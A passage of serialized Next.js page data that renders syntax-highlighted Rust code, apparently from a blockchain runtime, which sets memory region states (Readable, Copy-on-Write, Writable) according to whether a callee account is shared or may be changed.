token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\nbd6:[\"$\",\"span\",\"code-segment-103\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"original_data_len\"]}]\nbd7:[\"$\",\"span\",\"code-segment-104\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nbd8:[\"$\",\"span\",\"code-segment-105\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}]\nbd9:[\"$\",\"span\",\"code-segment-106\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\nbda:[\"$\",\"span\",\"code-segment-107\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nbdb:[\"$\",\"span\",\"line-number--14\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[14]}]\nbdc:[\"$\",\"span\",\"code-segment-109\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\nbdd:[\"$\",\"span\",\"code-segment-110\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd"])</script><script>self.__next_f.push([1,"\"},\"children\":[\"if\"]}]\nbde:[\"$\",\"span\",\"code-segment-111\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nbdf:[\"$\",\"span\",\"code-segment-112\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\nbe0:[\"$\",\"span\",\"code-segment-113\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nbe1:[\"$\",\"span\",\"code-segment-114\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Some\"]}]\nbe2:[\"$\",\"span\",\"code-segment-115\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nbe3:[\"$\",\"span\",\"code-segment-116\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region\"]}]\nbe4:[\"$\",\"span\",\"code-segment-117\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nbe5:[\"$\",\"span\",\"code-segment-118\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nbe6:[\"$\",\"span\",\"code-segment-119\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\nbe7:[\"$\",\"span\",\"code-segment-120\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" data_region \"]}]\nbe8:[\"$\",\"span\",\"code-segment-121\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\nbe9:[\"$\",\"span\",\"code-segment-122\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nbea:[\"$\",\"span\",\"line-number--15\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[15]}]\nbeb:[\"$\",\"span\",\"code-segment-124\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\nbec:[\"$\",\"span\",\"code-segment-125\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"match\"]}]\nbed:[\"$\",\"span\",\"code-segment-126\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nbee:[\"$\",\"span\",\"code-segment-127\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nbef:[\"$\",\"span\",\"code-segment-128\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]"])</script><script>self.__next_f.push([1,"}]\nbf0:[\"$\",\"span\",\"line-number--16\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[16]}]\nbf1:[\"$\",\"span\",\"code-segment-130\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            region\"]}]\nbf2:[\"$\",\"span\",\"code-segment-131\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nbf3:[\"$\",\"span\",\"code-segment-132\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"state\"]}]\nbf4:[\"$\",\"span\",\"code-segment-133\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nbf5:[\"$\",\"span\",\"code-segment-134\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"get\"]}]\nbf6:[\"$\",\"span\",\"code-segment-135\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nbf7:[\"$\",\"span\",\"code-segment-136\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nbf8:[\"$\",\"span\",\"code-segment-137\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nbf9:[\"$\",\"span\",\"code-segment-138\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nbfa:[\"$\",\"span\",\"line-number--17\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[17]}]\nbfb:[\"$\",\"span\",\"code-segment-140\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            callee_account\"]}]\nbfc:[\"$\",\"span\",\"code-segment-141\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nbfd:[\"$\",\"span\",\"code-segment-142\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"can_data_be_changed\"]}]\nbfe:[\"$\",\"span\",\"code-segment-143\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nbff:[\"$\",\"span\",\"code-segm"])</script><script>self.__next_f.push([1,"ent-144\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nc00:[\"$\",\"span\",\"code-segment-145\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nc01:[\"$\",\"span\",\"code-segment-146\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"is_ok\"]}]\nc02:[\"$\",\"span\",\"code-segment-147\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nc03:[\"$\",\"span\",\"code-segment-148\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nc04:[\"$\",\"span\",\"code-segment-149\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nc05:[\"$\",\"span\",\"code-segment-150\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nc06:[\"$\",\"span\",\"line-number--18\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[18]}]\nc07:[\"$\",\"span\",\"code-segment-152\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\nc08:[\"$\",\"span\",\"code-segment-153\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nc09:[\"$\",\"span\",\"code-segment-154\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nc0a:[\"$\",\"span\",\"code-segment-155\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\nc0b:[\"$\",\"span\",\"code-segment-156\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nc0c:[\"$\",\"span\",\"line-number--19\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[19]}]\nc0d:[\"$\",\"span\",\"code-segment-158\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\nc0e:[\"$\",\"span\",\"code-segment-159\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nc0f:[\"$\",\""])</script><script>self.__next_f.push([1,"span\",\"code-segment-160\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryState\"]}]\nc10:[\"$\",\"span\",\"code-segment-161\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nc11:[\"$\",\"span\",\"code-segment-162\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Readable\"]}]\nc12:[\"$\",\"span\",\"code-segment-163\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nc13:[\"$\",\"span\",\"code-segment-164\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nc14:[\"$\",\"span\",\"code-segment-165\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"true\"]}]\nc15:[\"$\",\"span\",\"code-segment-166\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nc16:[\"$\",\"span\",\"code-segment-167\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nc17:[\"$\",\"span\",\"code-segment-168\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\u003e\"]}]\nc18:[\"$\",\"span\",\"code-segment-169\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nc19:[\"$\",\"span\",\"code-segment-170\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\nc1a:[\"$\",\"span\",\"code-segment-171\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nc1b:[\"$\",\"span\",\"line-number--20\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[20]}]\nc1c:[\"$\",\"span\",\"code-segment-173\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\nc1d:[\"$\",\"span\",\"code-segment-174\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// If the account is still shared it means it wasn't written to yet during this\"]}]\nc1e:[\"$\",\"span\",\"code-segment-175\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nc1f:[\"$\",\"span\",\"line-number--21\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\""])</script><script>self.__next_f.push([1,":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[21]}]\nc20:[\"$\",\"span\",\"code-segment-177\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\nc21:[\"$\",\"span\",\"code-segment-178\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// transaction. We map it as CoW and it'll be copied the first time something\"]}]\nc22:[\"$\",\"span\",\"code-segment-179\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nc23:[\"$\",\"span\",\"line-number--22\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[22]}]\nc24:[\"$\",\"span\",\"code-segment-181\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\nc25:[\"$\",\"span\",\"code-segment-182\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// tries to write into it.\"]}]\nc26:[\"$\",\"span\",\"code-segment-183\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nc27:[\"$\",\"span\",\"line-number--23\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[23]}]\nc28:[\"$\",\"span\",\"code-segment-185\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\nc29:[\"$\",\"span\",\"code-segment-186\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}]\nc2a:[\"$\",\"span\",\"code-segment-187\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" callee_account\"]}]\nc2b:[\"$\",\"span\",\"code-segment-188\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nc2c:[\"$\",\"span\",\"code-segment-189\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d"])</script><script>self.__next_f.push([1,"49\"},\"children\":[\"is_shared\"]}]\nc2d:[\"$\",\"span\",\"code-segment-190\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nc2e:[\"$\",\"span\",\"code-segment-191\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nc2f:[\"$\",\"span\",\"code-segment-192\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nc30:[\"$\",\"span\",\"code-segment-193\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\nc31:[\"$\",\"span\",\"code-segment-194\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nc32:[\"$\",\"span\",\"line-number--24\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[24]}]\nc33:[\"$\",\"span\",\"code-segment-196\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}]\nc34:[\"$\",\"span\",\"code-segment-197\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\nc35:[\"$\",\"span\",\"code-segment-198\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" index_in_transaction \"]}]\nc36:[\"$\",\"span\",\"code-segment-199\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\nc37:[\"$\",\"span\",\"code-segment-200\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" callee_account\"]}]\nc38:[\"$\",\"span\",\"code-segment-201\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nc39:[\"$\",\"span\",\"code-segment-202\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"get_index_in_transaction\"]}]\nc3a:[\"$\",\"span\",\"code-segment-203\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nc3b:[\"$\",\"span\",\"code-segment-204\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nc3c:[\"$\",\"span\",\"code-segment-205\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\nc3d:[\"$\",\"span\",\"code-segment-206\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nc3e:[\""])</script><script>self.__next_f.push([1,"$\",\"span\",\"line-number--25\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[25]}]\nc3f:[\"$\",\"span\",\"line-number--26\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[26]}]\nc40:[\"$\",\"span\",\"code-segment-210\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                        \"]}]\nc41:[\"$\",\"span\",\"code-segment-211\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nc42:[\"$\",\"span\",\"code-segment-212\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"state\\n\"]}]\nc43:[\"$\",\"span\",\"line-number--27\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[27]}]\nc44:[\"$\",\"span\",\"code-segment-214\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                        \"]}]\nc45:[\"$\",\"span\",\"code-segment-215\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nc46:[\"$\",\"span\",\"code-segment-216\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"set\"]}]\nc47:[\"$\",\"span\",\"code-segment-217\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nc48:[\"$\",\"span\",\"code-segment-218\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryState\"]}]\nc49:[\"$\",\"span\",\"code-segment-219\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nc4a:[\"$\",\"span\",\"code-segment-220\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Cow\"]}]\nc4b:[\"$\",\"span\",\"code"])</script><script>self.__next_f.push([1,"-segment-221\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nc4c:[\"$\",\"span\",\"code-segment-222\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"index_in_transaction \"]}]\nc4d:[\"$\",\"span\",\"code-segment-223\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\nc4e:[\"$\",\"span\",\"code-segment-224\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nc4f:[\"$\",\"span\",\"code-segment-225\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\nc50:[\"$\",\"span\",\"code-segment-226\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nc51:[\"$\",\"span\",\"code-segment-227\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nc52:[\"$\",\"span\",\"code-segment-228\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\nc53:[\"$\",\"span\",\"code-segment-229\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nc54:[\"$\",\"span\",\"line-number--28\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[28]}]\nc55:[\"$\",\"span\",\"code-segment-231\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\nc56:[\"$\",\"span\",\"code-segment-232\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\nc57:[\"$\",\"span\",\"code-segment-233\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nc58:[\"$\",\"span\",\"code-segment-234\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"else\"]}]\nc59:[\"$\",\"span\",\"code-segment-235\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nc5a:[\"$\",\"span\",\"code-segment-236\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\nc5b:[\"$\",\"span\",\"code-segment-237\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nc5c:[\"$\",\"span\",\"line-number--29\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"displ"])</script><script>self.__next_f.push([1,"ay\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[29]}]\nc5d:[\"$\",\"span\",\"code-segment-239\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    region\"]}]\nc5e:[\"$\",\"span\",\"code-segment-240\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nc5f:[\"$\",\"span\",\"code-segment-241\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"state\"]}]\nc60:[\"$\",\"span\",\"code-segment-242\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nc61:[\"$\",\"span\",\"code-segment-243\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"set\"]}]\nc62:[\"$\",\"span\",\"code-segment-244\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nc63:[\"$\",\"span\",\"code-segment-245\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryState\"]}]\nc64:[\"$\",\"span\",\"code-segment-246\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nc65:[\"$\",\"span\",\"code-segment-247\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Writable\"]}]\nc66:[\"$\",\"span\",\"code-segment-248\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nc67:[\"$\",\"span\",\"code-segment-249\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\nc68:[\"$\",\"span\",\"code-segment-250\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nc69:[\"$\",\"span\",\"line-number--30\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[30]}]\nc6a:[\"$\",\"span\",\"code-segment-252\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\nc6b:[\"$\",\"span\",\"code-segment-253\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\nc6c:[\"$\",\"span\",\"code-segment-254\""])</script><script>self.__next_f.push([1,",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nc6d:[\"$\",\"span\",\"line-number--31\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[31]}]\nc6e:[\"$\",\"span\",\"code-segment-256\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\nc6f:[\"$\",\"span\",\"code-segment-257\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\nc70:[\"$\",\"span\",\"code-segment-258\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nc71:[\"$\",\"span\",\"line-number--32\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[32]}]\nc72:[\"$\",\"span\",\"line-number--33\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[33]}]\nc73:[\"$\",\"span\",\"code-segment-262\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\nc74:[\"$\",\"span\",\"code-segment-263\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nc75:[\"$\",\"span\",\"code-segment-264\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryState\"]}]\nc76:[\"$\",\"span\",\"code-segment-265\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nc77:[\"$\",\"span\",\"code-segment-266\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Writable\"]}]\nc78:[\"$\",\"span\",\"code-segment-267\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nc79:[\"$\",\"span\",\"code-segment-268\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"|\"]}"])</script><script>self.__next_f.push([1,"]\nc7a:[\"$\",\"span\",\"code-segment-269\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nc7b:[\"$\",\"span\",\"code-segment-270\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryState\"]}]\nc7c:[\"$\",\"span\",\"code-segment-271\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nc7d:[\"$\",\"span\",\"code-segment-272\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Cow\"]}]\nc7e:[\"$\",\"span\",\"code-segment-273\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nc7f:[\"$\",\"span\",\"code-segment-274\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"_\"]}]\nc80:[\"$\",\"span\",\"code-segment-275\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nc81:[\"$\",\"span\",\"code-segment-276\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nc82:[\"$\",\"span\",\"code-segment-277\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nc83:[\"$\",\"span\",\"code-segment-278\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"false\"]}]\nc84:[\"$\",\"span\",\"code-segment-279\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nc85:[\"$\",\"span\",\"code-segment-280\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nc86:[\"$\",\"span\",\"code-segment-281\",{\"className\":\"token 